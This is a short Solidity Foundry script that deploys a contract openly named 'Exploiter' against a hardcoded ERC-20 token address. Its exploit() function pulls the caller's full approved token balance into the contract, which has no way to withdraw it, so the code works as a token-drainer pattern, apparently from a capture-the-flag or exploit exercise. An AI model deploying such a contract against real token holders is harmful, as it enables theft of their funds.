// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {IERC20} from "@openzeppelin/token/ERC20/ERC20.sol";

contract Deployer is Script {
    function run() external {
        vm.startBroadcast();
        new Exploiter(0x0d13B071144c3F5E0060bAeDc107bA7CCa3F1CE9);
        vm.stopBroadcast();
    }
}

contract Exploiter {
    IERC20 public immutable token;

    constructor(address _token) {
        token = IERC20(_token);
    }

    function exploit() external {
        token.transferFrom(msg.sender, address(this), token.balanceOf(msg.sender));
    }
}